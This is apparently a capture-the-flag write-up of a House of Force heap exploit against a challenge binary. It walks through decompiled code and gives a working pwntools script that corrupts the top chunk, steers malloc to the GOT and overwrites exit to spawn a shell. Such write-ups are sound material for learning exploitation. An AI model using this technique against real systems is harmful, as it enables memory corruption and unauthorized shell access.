# House of Force

## Solution

We first notice that this challenge uses a version of libc before `2.29`, which means that we can overwrite the top chunk. Thus, we will try to overwrite the top chunk to write over some part of memory. We first analyze how this program uses malloc.

First, the program runs malloc and takes in user input to that buffer using `gets`:
```
00400add      char* rax_5 = malloc(bytes: 0x80)
...
00400b03      gets(buf: rax_5)
```
Then, the program runs malloc on a number of user input (if the user input is greater than `14`):
```
00400b2c      __isoc99_scanf(format: &data_4017aa, &var_38)
00400b39      if (var_38 u> 0xd)
00400b64          char* rax_13 = malloc(bytes: var_38)
```
Finally, the program again mallocs and writes user input to the buffer using `gets`:
```
00400ba0          char* rax_17 = malloc(bytes: 0x80)
...
00400bc6          gets(buf: rax_17)
```
Finally, we note that the binary has an `admin` function:
```
00400bd5  int64_t admin()
00400bdd      void* fsbase
00400bdd      int64_t rax = *(fsbase + 0x28)
00400bf3      system(line: "/bin/sh")
00400bfd      int64_t rax_3 = rax ^ *(fsbase + 0x28)
00400c06      if (rax_3 == 0)
00400c0e          return rax_3
00400c08      __stack_chk_fail()
00400c08      noreturn
```
Thus, we build an attack strategy. First, we use the first `gets` to overwrite the top chunk to be a large value. Next, we will malloc an very large value in order to bring to bring us to the `got` (we note that this will malloc a negative number. This is fine because the check is unsigned). Then, using the last malloc, we overwrite `exit` in the `got` with the `admin` function. The following code does this:
```python
p = start()

p.recvuntil(b'memory at 0x')
heap_leak = int(p.recvlineS().strip(), 16)
heap_start = heap_leak + 0x250
log.info(f"Heap starts at {hex(heap_start)}")

chain = b'A'*0x88
chain += p64(0xffffffffffffffff)
p.sendlineafter(b'>>>', chain)

top_chunk = heap_start + 0x90
log.info(f"Current top chunk at {hex(top_chunk)}")
offset = e.got['exit'] - top_chunk - 0x20
log.info(f"Mallocing offset of {offset}")
p.sendlineafter(b'>>>', str(offset).encode('utf-8'))

p.sendlineafter(b'complaint >>>', p64(e.symbols['admin']))

p.interactive()
```